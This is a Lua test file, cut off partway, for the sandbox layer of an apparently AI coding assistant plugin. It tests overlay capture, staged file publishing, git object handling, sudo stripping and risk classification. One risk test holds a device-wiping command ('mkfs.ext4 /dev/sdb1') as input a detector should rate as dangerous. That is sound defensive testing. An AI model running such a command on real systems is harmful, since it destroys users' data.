--- 沙箱视图：播种门禁/遮蔽目录/mount 列举/权限受限视图
--- @module 'NeoAI.tests.test_sandbox_view'
--- 由原 test_sandbox.lua 按用例分片而来（43 个用例，彼此独立、无跨用例共享状态）。

local tests = require("NeoAI.tests")

--- 保存/恢复全局配置
--- 测试普遍把 /tmp（vim.fn.tempname）当作工作区使用：默认关闭「临时根不产生候选」
--- （`ephemeral_roots = {}`），需要验证该行为的用例可显式传入 ephemeral_roots。
local function with_config(overrides, fn)
  local config_store = require("NeoAI.kernel.config_store")
  local saved = config_store.get_all()
  local merged = vim.deepcopy(overrides or {})
  merged.tools = merged.tools or {}
  merged.tools.sandbox = merged.tools.sandbox or {}
  if merged.tools.sandbox.ephemeral_roots == nil then
    merged.tools.sandbox.ephemeral_roots = {}
  end
  config_store.load(merged)
  local ok, err = pcall(fn)
  config_store.load(saved)
  if not ok then error(err, 0) end
end

tests.suite("sandbox_view", function(_, it)
  it("播种视图门禁：覆盖根内暂存不拒绝、覆盖根外仍 fail-closed", function(t)
    local wrapper = require("NeoAI.sandbox.execution.wrapper")
    local sandbox = require("NeoAI.sandbox")
    local fs = require("NeoAI.utils.fs")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    fs.write_file(dir .. "/in.txt", "base\n")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("edit_file",
        { file_path = dir .. "/in.txt", mode = "write", content = "edited\n", description = "t" }, {})
        :then_(function()
          -- 覆盖 dir：暂存在覆盖根内 → 放行（无 overlay 的 T2 视图）。
          local ok1, err1 = wrapper.overlay_gate({}, { userns = true, covered_roots = { dir } })
          t.true_(ok1, "覆盖根内暂存不应拒绝: " .. tostring(err1))
          -- 未覆盖：仍 fail-closed。
          local ok2, err2 = wrapper.overlay_gate({}, { userns = true })
          t.false_(ok2, "覆盖根外暂存应拒绝")
          t.matches("SANDBOX_STAGING_UNCOVERED", tostring(err2))
          done = true
        end, function(e) t.true_(false, "edit_file 不应失败: " .. tostring(e and e.message or e)); done = true end)
      t.true_(vim.wait(15000, function() return done end), "应完成")
    end)
    sandbox.reset()
    vim.fn.delete(dir, "rf")
  end)

  it("无 overlay 播种视图：命令可见真实文件，写入仍冻结为候选", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    ---@type table<string, any>
    local runtime = require("NeoAI.sandbox.execution.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    fs.write_file(dir .. "/real.txt", "REAL_CONTENT\n")
    local prev = vim.fn.getcwd()
    vim.fn.chdir(dir)
    local saved_avail, saved_writable = runtime.overlay_available, runtime.overlay_writable
    ---@diagnostic disable-next-line: duplicate-set-field
    runtime.overlay_available = function() return false end
    ---@diagnostic disable-next-line: duplicate-set-field
    runtime.overlay_writable = function() return false end
    local ok, err = pcall(function()
      with_config({ tools = { approval = { mode = "async" }, sandbox = {
        mode = "dry_run", review = { enabled = true },
        degraded_seed = true,
      } } }, function()
        sandbox.reset()
        local done = false
        require("NeoAI.tools").execute("run_command", {
          command = "cat real.txt && echo NEW > added.txt", description = "t",
        }, {}):then_(function(r)
          t.matches("REAL_CONTENT", tostring(r), "播种视图应能看到真实磁盘文件")
          t.eq(0, vim.fn.filereadable(dir .. "/added.txt"), "命令写入不应落真实盘（已暂存）")
          t.not_nil(require("NeoAI.sandbox.execution.candidate").read_path(dir .. "/added.txt"),
            "应存在暂存副本")
          done = true
        end, function(e) t.true_(false, "不应失败: " .. tostring(e and e.message or e)); done = true end)
        t.true_(vim.wait(20000, function() return done end), "run_command 应完成")
      end)
    end)
    runtime.overlay_available, runtime.overlay_writable = saved_avail, saved_writable
    vim.fn.chdir(prev)
    sandbox.reset()
    vim.fn.delete(dir, "rf")
    if not ok then error(err, 0) end
  end)

  it("seed_view：播种真实根（内容/权限/链接/增量/上限）", function(t)
    local fs = require("NeoAI.utils.fs")
    local candidate = require("NeoAI.sandbox.execution.candidate")
    local src = vim.fn.tempname()
    fs.ensure_dir(src)
    fs.write_file(src .. "/a.txt", "A\n")
    fs.ensure_dir(src .. "/sub")
    fs.write_file(src .. "/sub/b.sh", "#!/bin/sh\n")
    fs.chmod(src .. "/sub/b.sh", 493) -- 0755
    vim.uv.fs_symlink("a.txt", src .. "/link")
    local dst = vim.fn.tempname()
    fs.ensure_dir(dst)
    local r = candidate.seed_view(src, dst, { max_bytes = 1024 * 1024 })
    t.eq(3, r.copied, "应播种 2 文件 + 1 链接（目录不计）")
    t.eq("A\n", fs.read_file(dst .. "/a.txt"), "内容应一致")
    t.eq(493, (vim.uv.fs_stat(dst .. "/sub/b.sh").mode % 512), "应保留可执行位")
    t.eq("a.txt", vim.uv.fs_readlink(dst .. "/link"), "符号链接应保留")
    -- 增量：源未变时全部跳过。
    local r2 = candidate.seed_view(src, dst, { max_bytes = 1024 * 1024 })
    t.eq(0, r2.copied, "源未变时应全部跳过")
    t.eq(3, r2.skipped, "应跳过 3 项")
    -- 上限：超过上限截断（调用方据此 fail-closed）。
    local dst2 = vim.fn.tempname()
    fs.ensure_dir(dst2)
    local r3 = candidate.seed_view(src, dst2, { max_bytes = 1 })
    t.true_(r3.truncated, "超过上限应截断")
    vim.fn.delete(src, "rf")
    vim.fn.delete(dst, "rf")
    vim.fn.delete(dst2, "rf")
  end)

  it("工具子进程：超大文件以 blob 进入候选（不落真实盘、不阻塞主线程）", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local sandbox = require("NeoAI.sandbox")
    local exec = require("NeoAI.sandbox.execution.exec")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true }, max_file_bytes = 1024 } } }, function()
      sandbox.reset()
      -- 暂存根必须可被捕获：不能位于 `<cache>/NeoAI`（自身运行时，捕获阶段整棵排除）。
      local dir = vim.fn.tempname()
      vim.fn.mkdir(dir, "p")
      local small = dir .. "/small.txt"
      local big = dir .. "/big.bin"
      pcall(os.remove, small)
      pcall(os.remove, big)
      local done = false
      exec.run({ "bash", "-c", "echo hi > " .. small .. "; head -c 4096 /dev/zero > " .. big }, {
        name = "big", writable_roots = { dir }, network = false, timeout_ms = 20000,
      }):then_(function() done = true end, function() done = true end)
      t.true_(vim.wait(20000, function() return done end, 20), "子进程应完成")
      t.eq(0, vim.fn.filereadable(small), "小文件不应落盘（已暂存）")
      t.eq(0, vim.fn.filereadable(big), "大文件不应落盘")
      local cand = require("NeoAI.sandbox.execution.candidate")
      t.not_nil(cand.read_path(small), "小文件应进入候选/暂存")
      local big_staged = cand.read_path(big)
      t.not_nil(big_staged, "超大文件应以 blob 进入候选/暂存")
      t.eq(4096, vim.fn.getfsize(big_staged), "暂存大文件内容应完整（4096 字节）")
      pcall(vim.fn.delete, dir, "rf")
    end)
  end)

  it("异步捕获：超大文件以 blob 进入候选且不进入 base 哈希列表", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.execution.candidate")
    local control = require("NeoAI.sandbox.execution.control")
    local store = require("NeoAI.sandbox.state.store")
    with_config({ tools = { sandbox = {
      workspace_root = vim.fn.tempname() .. "/sb", max_file_bytes = 1024,
    } } }, function()
      sandbox.reset()
      local dir = fs.canonical(vim.fn.tempname())
      fs.ensure_dir(dir)
      local base = vim.fn.tempname()
      local upper, work = base .. "/upper", base .. "/work"
      fs.ensure_dir(upper); fs.ensure_dir(work)
      local a = control.new_attempt("run_command", {}, {}, { effect = "process" })
      candidate.begin(a, assert(store.root()))
      -- 命令在 overlay 中创建一个小文件和一个超过上限的大文件（base 也放一份大文件，
      -- 验证它不会进入 base 哈希列表被读取/哈希）。
      fs.write_file(dir .. "/big.bin", string.rep("y", 4096))
      fs.write_file(upper .. "/small.txt", "hi\n")
      local bf = assert(io.open(upper .. "/big.bin", "wb")); bf:write(string.rep("x", 4096)); bf:close()
      local done, err = false, nil
      candidate.capture_overlay_async(a.attempt_id, dir, upper):then_(function() done = true end, function(e)
        err = e; done = true
      end)
      t.true_(vim.wait(20000, function() return done end, 20), "捕获应完成: " .. tostring(err))
      local mapping = candidate.mapping(a.attempt_id)
      t.not_nil(mapping[dir .. "/small.txt"], "小文件应进入候选")
      local bentry = mapping[dir .. "/big.bin"]
      t.not_nil(bentry, "超大文件应以 blob 进入候选")
      t.true_(bentry.large == true, "超大文件应标记 large")
      t.eq(nil, bentry.base_hash, "超大文件不应做 base 内容哈希")
      t.not_nil(bentry.base_sig, "超大文件应以 stat 签名做发布 CAS")
      candidate.cleanup(a.attempt_id)
      vim.fn.delete(dir, "rf")
      vim.fn.delete(base, "rf")
    end)
  end)

  it("冻结+发布：超大文件以 blob 完整落盘（torch .so 场景）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.execution.candidate")
    local control = require("NeoAI.sandbox.execution.control")
    local store = require("NeoAI.sandbox.state.store")
    local dir = fs.canonical(vim.fn.tempname())
    with_config({ tools = { sandbox = {
      workspace_root = vim.fn.tempname() .. "/sb", max_file_bytes = 1024,
    } } }, function()
      sandbox.reset()
      fs.ensure_dir(dir)
      local a = control.new_attempt("run_command", {}, {}, { effect = "process" })
      candidate.begin(a, assert(store.root()))
      local target = dir .. "/libtorch_python.so"
      local staged = candidate.stage_path(a.attempt_id, target)
      local content = string.rep("Z", 8192)
      fs.write_file(staged, content)
      local cand = candidate.finish(a.attempt_id)
      local entry
      for _, f in ipairs(cand.files) do if f.path == target then entry = f end end
      t.not_nil(entry, "超大文件应进入候选")
      t.eq(nil, entry.content, "超大文件不应内嵌内容（避免 JSON 膨胀）")
      t.not_nil(entry.blob, "超大文件应引用 blob")
      t.eq(8192, vim.fn.getfsize(entry.blob), "blob 应含完整内容")
      local res = candidate.publish(cand, {})
      t.true_(res.ok, "应完整发布: " .. tostring(res.reason))
      t.eq(8192, vim.fn.getfsize(target), "真实文件应完整（不再缺失）")
      t.eq(content, fs.read_file(target), "落盘内容应与 blob 一致")
      candidate.cleanup(a.attempt_id)
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("发布：blob 候选按文件复制落盘且内容完整", function(t)
    local fs = require("NeoAI.utils.fs")
    local candidate = require("NeoAI.sandbox.execution.candidate")
    local root = fs.canonical(vim.fn.tempname())
    fs.ensure_dir(root)
    local blob = root .. "/blob.bin"
    local content = string.rep("A", 65536)
    fs.write_file(blob, content)
    local target = root .. "/out/libtorch_python.so"
    with_config({ tools = { sandbox = { max_file_bytes = 1024 } } }, function()
      local res = candidate.publish({
        candidate_digest = "sha256:blobpub",
        files = { {
          path = target, action = "create", after_hash = "sig:1:1:65536",
          blob = blob, large = true, mode = 420,
        } },
      })
      t.true_(res.ok, "blob 发布应成功: " .. tostring(res.reason))
      t.eq(65536, vim.fn.getfsize(target), "落盘内容应与 blob 一致")
      t.eq(content, fs.read_file(target), "内容应完整")
    end)
    vim.fn.delete(root, "rf")
  end)

  it("工作区暂存快照：大文件条目暴露 large 标记（供常驻物化走复制而非内嵌）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.execution.candidate")
    local control = require("NeoAI.sandbox.execution.control")
    local store = require("NeoAI.sandbox.state.store")
    local dir = fs.canonical(vim.fn.tempname())
    fs.ensure_dir(dir)
    with_config({ tools = { sandbox = {
      workspace_root = vim.fn.tempname() .. "/sb", max_file_bytes = 1024,
    } } }, function()
      sandbox.reset()
      local a = control.new_attempt("run_command", {}, {}, { effect = "process" })
      candidate.begin(a, assert(store.root()))
      local target = dir .. "/big.bin"
      local staged = candidate.stage_path(a.attempt_id, target)
      fs.write_file(staged, string.rep("Z", 4096))
      local cand = candidate.finish(a.attempt_id)
      candidate.merge_candidate(cand)
      local entry
      for _, o in ipairs(candidate.workspace_overrides()) do
        if o.real == target then entry = o end
      end
      t.not_nil(entry, "应存在暂存条目")
      t.true_(entry.large == true, "大文件条目应暴露 large 标记")
      candidate.cleanup(a.attempt_id)
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("工作区暂存快照：常驻命令产物暴露 fresh_resident（供物化跳过回写）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.execution.candidate")
    local control = require("NeoAI.sandbox.execution.control")
    local store = require("NeoAI.sandbox.state.store")
    local dir = fs.canonical(vim.fn.tempname())
    fs.ensure_dir(dir)
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      local a = control.new_attempt("run_command", {}, {}, { effect = "process" })
      candidate.begin(a, assert(store.root()))
      local p = dir .. "/a.txt"
      local staged = candidate.stage_path(a.attempt_id, p)
      fs.write_file(staged, "hello\n")
      local cand = candidate.finish(a.attempt_id)
      candidate.merge_candidate(cand, { from_command = true, resident = true })
      local entry
      for _, o in ipairs(candidate.workspace_overrides()) do if o.real == p then entry = o end end
      t.not_nil(entry, "应存在暂存条目")
      t.true_(entry.fresh_resident == true, "常驻命令产物应暴露 fresh_resident")
      t.not_nil(entry.fresh_ssig, "应记录 fresh_ssig")
      candidate.cleanup(a.attempt_id)
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("异步捕获：未变文件第二次捕获不重复处理（不进入 mapping）", function(t)
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.execution.candidate")
    local control = require("NeoAI.sandbox.execution.control")
    local store = require("NeoAI.sandbox.state.store")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      local dir = fs.canonical(vim.fn.tempname())
      fs.ensure_dir(dir)
      local base = vim.fn.tempname()
      local upper, work = base .. "/upper", base .. "/work"
      fs.ensure_dir(upper); fs.ensure_dir(work)
      local a1 = control.new_attempt("run_command", {}, {}, { effect = "process" })
      candidate.begin(a1, assert(store.root()))
      fs.write_file(upper .. "/f.txt", "cmd\n")
      local d1 = false
      candidate.capture_overlay_async(a1.attempt_id, dir, upper):then_(function() d1 = true end, function() d1 = true end)
      t.true_(vim.wait(10000, function() return d1 end, 20), "第一次捕获应完成")
      t.not_nil(candidate.mapping(a1.attempt_id)[dir .. "/f.txt"], "首次应捕获")
      -- 第二次捕获（新 attempt）：overlay 未变，应整体跳过、不产生任何 mapping 条目。
      local a2 = control.new_attempt("run_command", {}, {}, { effect = "process" })
      candidate.begin(a2, assert(store.root()))
      local d2 = false
      candidate.capture_overlay_async(a2.attempt_id, dir, upper):then_(function() d2 = true end, function() d2 = true end)
      t.true_(vim.wait(10000, function() return d2 end, 20), "第二次捕获应完成")
      t.eq(nil, candidate.mapping(a2.attempt_id)[dir .. "/f.txt"], "未变文件第二次不应重复处理")
      candidate.cleanup(a1.attempt_id)
      candidate.cleanup(a2.attempt_id)
      vim.fn.delete(dir, "rf")
      vim.fn.delete(base, "rf")
    end)
  end)

  it("异步捕获：.git 内部未变也要重登记（防原子组取代后对象丢失→悬空引用）", function(t)
    -- 回归：git 原子组候选被同路径新候选**整组取代**时会丢弃旧候选（连同其承载的对象）。
    -- 若 `.git` 对象沿用「未变快速跳过」，新候选便不再包含该对象，而 index 仍引用它 →
    -- 发布闸门拒绝（GIT_REFERENTIAL_INTEGRITY: index -> <oid>）。故 `.git` 内部路径每次捕获
    -- 都必须重新登记。
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.execution.candidate")
    local control = require("NeoAI.sandbox.execution.control")
    local store = require("NeoAI.sandbox.state.store")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      local dir = fs.canonical(vim.fn.tempname())
      fs.ensure_dir(dir)
      local base = vim.fn.tempname()
      local upper = base .. "/upper"
      fs.ensure_dir(upper .. "/.git/objects/ab")
      local obj_rel = ".git/objects/ab/" .. string.rep("c", 38)
      fs.write_file(upper .. "/" .. obj_rel, "blob-bytes")
      local a1 = control.new_attempt("git_add", {}, {}, { effect = "process" })
      candidate.begin(a1, assert(store.root()))
      local d1 = false
      candidate.capture_overlay_async(a1.attempt_id, dir, upper):then_(function() d1 = true end, function() d1 = true end)
      t.true_(vim.wait(10000, function() return d1 end, 20), "第一次捕获应完成")
      t.not_nil(candidate.mapping(a1.attempt_id)[dir .. "/" .. obj_rel], "首次应捕获 .git 对象")
      -- 第二次捕获（新 attempt）：overlay 内容未变。
      local a2 = control.new_attempt("git_commit", {}, {}, { effect = "process" })
      candidate.begin(a2, assert(store.root()))
      local d2 = false
      candidate.capture_overlay_async(a2.attempt_id, dir, upper):then_(function() d2 = true end, function() d2 = true end)
      t.true_(vim.wait(10000, function() return d2 end, 20), "第二次捕获应完成")
      t.not_nil(candidate.mapping(a2.attempt_id)[dir .. "/" .. obj_rel],
        ".git 对象第二次捕获也必须重登记（不走未变快速跳过）")
      candidate.cleanup(a1.attempt_id)
      candidate.cleanup(a2.attempt_id)
      vim.fn.delete(dir, "rf")
      vim.fn.delete(base, "rf")
    end)
  end)

  it("捕获：从暂存物化的 .git 对象仍重登记（防 ws_skip 丢对象→悬空引用）", function(t)
    -- 回归：git_add 候选冻结后 merge 进工作区暂存；后续 git_commit 从暂存物化出同一对象，
    -- 此时 overlay 内容与暂存内容相等。若走 ws_skip（内容一致即跳过）会漏登记该对象——而
    -- git_add 候选已被 git_commit 整组取代（对象随旧候选一并丢弃），新候选的 index 仍引用它，
    -- 发布闸门以 GIT_REFERENTIAL_INTEGRITY 拒绝。故 `.git` 内部路径也必须绕过 ws_skip。
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.execution.candidate")
    local control = require("NeoAI.sandbox.execution.control")
    local store = require("NeoAI.sandbox.state.store")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      local dir = fs.canonical(vim.fn.tempname())
      fs.ensure_dir(dir)
      local base = vim.fn.tempname()
      local obj_rel = ".git/objects/ab/" .. string.rep("c", 38)

      -- attempt 1（git_add）：overlay 新写对象 → 捕获 → 候选 → merge 进工作区暂存。
      local upper1 = base .. "/upper1"
      fs.ensure_dir(vim.fn.fnamemodify(upper1 .. "/" .. obj_rel, ":h"))
      fs.write_file(upper1 .. "/" .. obj_rel, "blob-bytes")
      local a1 = control.new_attempt("git_add", {}, {}, { effect = "process" })
      candidate.begin(a1, assert(store.root()))
      local d1 = false
      candidate.capture_overlay_async(a1.attempt_id, dir, upper1):then_(function() d1 = true end, function() d1 = true end)
      t.true_(vim.wait(10000, function() return d1 end, 20), "第一次捕获应完成")
      local cand1 = candidate.finish(a1.attempt_id)
      t.not_nil(cand1, "第一次应冻结出候选")
      candidate.merge_candidate(cand1)

      -- attempt 2（git_commit）：新 overlay 从暂存物化该对象，捕获必须重登记（不走 ws_skip）。
      local upper2, work2 = base .. "/upper2", base .. "/work2"
      fs.ensure_dir(upper2); fs.ensure_dir(work2)
      local a2 = control.new_attempt("git_commit", {}, {}, { effect = "process" })
      candidate.begin(a2, assert(store.root()))
      candidate.materialize_overlay({ { root = dir, upper = upper2, work = work2, mode = "overlay" } })
      t.true_(fs.exists(upper2 .. "/" .. obj_rel), "暂存对象应物化进新 overlay")
      local d2 = false
      candidate.capture_overlay_async(a2.attempt_id, dir, upper2):then_(function() d2 = true end, function() d2 = true end)
      t.true_(vim.wait(10000, function() return d2 end, 20), "第二次捕获应完成")
      t.not_nil(candidate.mapping(a2.attempt_id)[dir .. "/" .. obj_rel],
        "从暂存物化的 .git 对象必须重登记（不走 ws_skip）")
      candidate.cleanup(a1.attempt_id)
      candidate.cleanup(a2.attempt_id)
      vim.fn.delete(dir, "rf")
      vim.fn.delete(base, "rf")
    end)
  end)

  it("冻结：非 git 写类工具不发布 .git 指针（防悬空引用回归）", function(t)
    -- 回归：git_add/git_commit 会在 overlay 里留下 `.git/index` 指针；其后的非 git 工具
    -- （如 run_command）若因 `.git` mtime 新鲜被「全量遍历捕获」，会把该残留指针一并收入
    -- 自己的候选——但该候选通常不含它引用的对象，发布时被 `_git_publish_gate` 拒绝
    -- （GIT_REFERENTIAL_INTEGRITY: index -> <oid>），整单失败。
    -- 修复：非 git 写类工具剔除 `.git` 指针（保留对象库）。
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    local candidate = require("NeoAI.sandbox.execution.candidate")
    local control = require("NeoAI.sandbox.execution.control")
    local store = require("NeoAI.sandbox.state.store")
    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
      sandbox.reset()
      local dir = fs.canonical(vim.fn.tempname())
      fs.ensure_dir(dir .. "/.git/objects/c2")
      local obj_rel = ".git/objects/c2/" .. string.rep("a", 38)

      -- 非 git 工具：残留指针 + 对象 + 普通文件都在 overlay 里。
      local a = control.new_attempt("run_command", {}, {}, { effect = "process" })
      candidate.begin(a, assert(store.root()))
      local function stage(rel, content)
        local staged = candidate.stage_path(a.attempt_id, dir .. "/" .. rel)
        fs.write_file(staged, content)
      end
      stage(".git/index", "DIRC\0\0\0\2")
      stage(".git/HEAD", "ref: refs/heads/main\n")
      stage(obj_rel, "blob-bytes")
      stage("f.txt", "cmd\n")
      local cand = candidate.finish(a.attempt_id)
      local have = {}
      for _, f in ipairs(cand.files) do have[f.path] = true end
      t.eq(nil, have[dir .. "/.git/index"], "非 git 工具不应发布 .git 指针（index）")
      t.eq(nil, have[dir .. "/.git/HEAD"], "非 git 工具不应发布 .git 指针（HEAD）")
      t.not_nil(have[dir .. "/" .. obj_rel], "对象库仍应保留（内容寻址、携带无害）")
      t.not_nil(have[dir .. "/f.txt"], "普通文件应保留")
      candidate.cleanup(a.attempt_id)

      -- 对照：git 写类工具仍应携带 `.git` 指针（其对象/指针须原子发布）。
      local b = control.new_attempt("git_commit", {}, {}, { effect = "process" })
      candidate.begin(b, assert(store.root()))
      local staged_idx = candidate.stage_path(b.attempt_id, dir .. "/.git/index")
      fs.write_file(staged_idx, "DIRC\0\0\0\2")
      local cand2 = candidate.finish(b.attempt_id)
      local have2 = {}
      for _, f in ipairs(cand2.files) do have2[f.path] = true end
      t.not_nil(have2[dir .. "/.git/index"], "git 写类工具应携带 .git 指针")
      candidate.cleanup(b.attempt_id)

      vim.fn.delete(dir, "rf")
      vim.fn.delete(store.root(), "rf")
    end)
  end)

  it("run_command：非零退出以结构化 error 返回（UI 显示失败）", function(t)
    local registry = require("NeoAI.tools.registry")
    local tool = assert(registry.get("run_command"))
    t.not_nil(tool, "run_command 已注册")
    local res = nil
    tool.func({ command = "sh -c 'echo out; exit 2'", description = "t" },
      function(v) res = v end, function(e) res = e end, {})
    t.true_(vim.wait(5000, function() return res ~= nil end, 50), "命令应返回")
    local decoded = require("NeoAI.utils.json").decode_or_nil(assert(res))
    t.true_(type(decoded) == "table" and decoded.error ~= nil, "非零退出应含 error 字段（UI 判失败）")
    t.true_(tostring(decoded.error):find("退出码 2", 1, true) ~= nil, "error 应含退出码")
    t.true_(tostring(decoded.output):find("out", 1, true) ~= nil, "output 应保留终端输出")
    -- 退出码 0 仍为普通文本（成功）
    local ok_res = nil
    tool.func({ command = "echo fine", description = "t" },
      function(v) ok_res = v end, function(e) ok_res = e end, {})
    t.true_(vim.wait(5000, function() return ok_res ~= nil end, 50), "命令应返回")
    t.eq(nil, require("NeoAI.utils.json").decode_or_nil(assert(ok_res)), "成功应为普通文本")
  end)

  it("沙箱内 sudo/doas 被剥离（已是 root，含链式/多行/-u/-i 形式）", function(t)
    local runtime = require("NeoAI.sandbox.execution.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local sandbox = require("NeoAI.sandbox")
    with_config({
      tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } },
    }, function()
      sandbox.reset()
      -- 覆盖：前导、链式、多行、-u/-i、env 包装、引号内空白保留。
      local cmd = table.concat({
        "sudo sh -c 'echo A_OK'",
        "echo b && sudo true && echo B_OK",
        "sudo -u nobody id -u >/dev/null 2>&1 && echo C_OK",
        "sudo -i </dev/null >/dev/null 2>&1; echo D_OK",
        "env FOO=1 sudo true && echo E_OK",
        "echo \"x  y\" && sudo true",
      }, "\n")
      local done, out = false, ""
      require("NeoAI.tools").execute("run_command", { command = cmd, description = "t", timeout_ms = 30000 }, {})
        :then_(function(r) out = tostring(r); done = true end, function(e) out = tostring(e); done = true end)
      t.true_(vim.wait(40000, function() return done end), "命令应完成")
      for _, k in ipairs({ "A_OK", "B_OK", "C_OK", "D_OK", "E_OK" }) do
        t.true_(out:find(k, 1, true) ~= nil, "应输出 " .. k .. "，实际: " .. tostring(out))
      end
      t.true_(out:find("x  y", 1, true) ~= nil, "引号内空白应保留，实际: " .. tostring(out))
      t.true_(out:find("sudo:", 1, true) == nil, "不应出现 sudo 报错，实际: " .. tostring(out))
      t.true_(out:find("PERM_SUDOERS", 1, true) == nil, "不应出现 PERM_SUDOERS，实际: " .. tostring(out))
    end)
  end)

  it("包管理器识别：扩展名单与路径特征，改动封顶 L2", function(t)
    local privilege = require("NeoAI.sandbox.execution.privilege")
    for _, cmd in ipairs({ "npx create-react-app x", "uv pip install requests",
      "conda install numpy", "cargo install ripgrep", "npm i lodash" }) do
      local r = privilege.classify("run_command", { command = cmd }, { effect = "process" })
      t.true_(r.package, "应识别为包安装: " .. cmd)
    end
    t.eq("npm", privilege.package_path_manager("/x/node_modules/express/index.js"), "node_modules → npm")
    t.eq("pip", privilege.package_path_manager("/usr/lib/python3/dist-packages/requests/x.py"), "dist-packages → pip")
    t.eq("apt", privilege.package_path_manager("/var/lib/apt/lists/x"), "apt lists → apt")
    t.eq("cargo", privilege.package_path_manager("/root/.cargo/registry/x"), "cargo registry → cargo")
    t.eq("conda", privilege.package_path_manager("/opt/conda/pkgs/x"), "conda pkgs → conda")
    t.eq(nil, privilege.package_path_manager("/root/project/src/main.lua"), "普通文件不误判")
    local risk = require("NeoAI.sandbox.review.risk")
    local r = risk.classify({ package = true, paths = { "/root/.cargo/registry/x" }, secret = true })
    t.eq(1, r.level, "安全包安装封顶中危（L1）")
    local rs = risk.classify({ package = true, package_sensitive = true, paths = { "/var/lib/apt/lists/x" } })
    t.eq(2, rs.level, "敏感包安装（改动软件源/密钥）保留 L2")
  end)

  it("结果路径还原：暂存路径替换为真实路径，无暂存路径字符串快速原样返回", function(t)
    local wrapper = require("NeoAI.sandbox.execution.wrapper")
    local staged = "/dev/shm/.cache-x/sessions/s1/abc/notes.txt"
    local real = "/home/u/proj/notes.txt"
    local mapping = { [real] = { staged = staged } }
    local out = wrapper._rewrite_result(mapping, "read " .. staged .. " ok")
    t.true_(out:find(real, 1, true) ~= nil, "应还原为真实路径")
    t.true_(out:find(staged, 1, true) == nil, "不应残留暂存路径")
    -- 前缀不匹配的字符串：不触发逐条 gsub，原样返回（大量暂存时的快速路径）
    local plain = "hello world /tmp/other.txt"
    t.eq(plain, wrapper._rewrite_result(mapping, plain), "无暂存路径应原样返回")
    local tbl = wrapper._rewrite_result(mapping, { msg = staged, n = 1 })
    t.eq(real, tbl.msg, "表内字符串字段应还原")
    t.eq(1, tbl.n, "非字符串字段不变")
  end)

  it("包管理器识别：跳过 sudo/env/bash -c/for…do 包装器，避免漏判升 L3", function(t)
    local privilege = require("NeoAI.sandbox.execution.privilege")
    local risk = require("NeoAI.sandbox.review.risk")
    local wrapped = {
      "sudo apt-get install -y curl",
      "cd /tmp && sudo apt-get install -y curl",
      "env sudo apt-get install -y curl",
      "bash -c 'apt-get install -y curl'",
      "for p in a b; do apt-get install -y $p; done",
      "sh -c \"pip install requests\"",
    }
    for _, cmd in ipairs(wrapped) do
      local req = privilege.classify("run_command", { command = cmd }, { effect = "process" })
      t.true_(req.package, "包装器命令应识别为包安装: " .. cmd)
      local r = risk.classify({
        package = req.package, paths = { "/var/lib/apt/lists/x" }, secret = true,
        privilege_tier = req.tier, network = req.network, command = cmd,
      })
      t.eq(1, r.level, "安全包安装封顶中危（L1），不因密钥误报升 L3: " .. cmd)
    end
    -- 非包管理器命令不应误判（首个真实命令不是包管理器）
    t.false_(privilege.classify("run_command", { command = "echo npm" }, { effect = "process" }).package,
      "echo npm 不应识别为包安装")
    -- package_info 同样跳过包装器提取管理器与包名
    local info = privilege.package_info("sudo apt-get install -y curl")
    t.eq("apt-get", info and info.manager, "应提取管理器")
    t.eq("apt-get:curl", info and info.key, "应提取包名合并键")
  end)

  it("风险分级：包安装不因工作区外/密钥误报升到 L3", function(t)
    local risk = require("NeoAI.sandbox.review.risk")
    local r = risk.classify({
      package = true, paths = { "/var/lib/apt/lists/x" }, secret = true,
      network = true, privilege_tier = 1,
    })
    t.eq(1, r.level, "安全包安装应封顶中危（L1）")
    local rs = risk.classify({
      package = true, package_sensitive = true, paths = { "/var/lib/apt/lists/x" },
    })
    t.eq(2, rs.level, "敏感包安装（改动第三方软件源/密钥）保留 L2")
    t.eq(3, risk.dangerous_level("mkfs.ext4 /dev/sdb1"), "设备级破坏命令应为 L3")
    local r2 = risk.classify({ package = true, command = "mkfs.ext4 /dev/sdb1", paths = { "/var/lib/apt/lists/x" } })
    t.eq(3, r2.level, "破坏性包命令仍应 L3")
  end)

  it("资源限制：默认按宿主动态推导（CPU/内存/PID），静态值优先", function(t)
    local cgroup = require("NeoAI.sandbox.execution.cgroup")
    t.true_(cgroup.limits_configured(), "默认应启用资源限制")
    local l = cgroup.resolve_limits()
